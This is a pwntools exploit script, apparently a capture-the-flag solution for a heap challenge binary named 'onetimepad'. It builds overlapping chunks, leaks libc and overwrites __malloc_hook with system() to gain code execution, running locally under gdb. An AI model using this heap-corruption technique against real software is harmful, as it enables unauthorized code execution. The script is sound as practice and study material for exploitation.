from pwn import *
import time


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def write(data):
    io.recvuntil(b'> ')
    io.sendline(b'w')
    io.sendline(data)
    # time.sleep(0.2)
    io.recvuntil("w̲rite")


@debug
def read(idx):
    io.recvuntil(b'> ')
    io.sendline(b'r')
    io.sendline(b'%d' % idx)
    data = io.recvline()
    io.recvuntil("w̲rite")
    return data


@debug
def rewrite(idx, data):
    io.recvuntil(b'> ')
    io.sendline(b'e')
    io.sendline(b'%d' % idx)
    io.sendline(data)
    # time.sleep(0.2)
    io.recvuntil("w̲rite")


binpath = './onetimepad'

elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
set $pad=0x0000555555558060
# menu
b *(0x0000555555554000+0x15C9)
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)

write(b'A' * 0x548)  # 0
write(b'B' * 0x38)   # 1
write(b'C' * 0x38)   # 2

read(0)
read(2)
read(1)

rewrite(1, b'')

write(b'E' * 0x38)  # 0
write(b'F' * 0x38)  # 1 (overlapping chunk)

write(b'D' * 0x500)  # 2

read(2)

data = read(1)
addr_libc = u64(data.ljust(8, b'\x00')) - 0x1e4ca0
print("addr_libc = 0x{:x}".format(addr_libc))

payload = b''
payload += b'G' * 0x517
write(payload)  # 1 (NULL out a byte)

read(1)

payload = b''
payload += b'G' * 0x510
payload += p64(addr_libc + libc.symbols['__malloc_hook'] - 0x38)[:6]
write(payload)  # 1 (overwrite next of entries[0x40])

write(b'H' * 0x38)  # consume
write(b'I' * 0x38 + p64(addr_libc + libc.symbols['system']))

io.interactive()
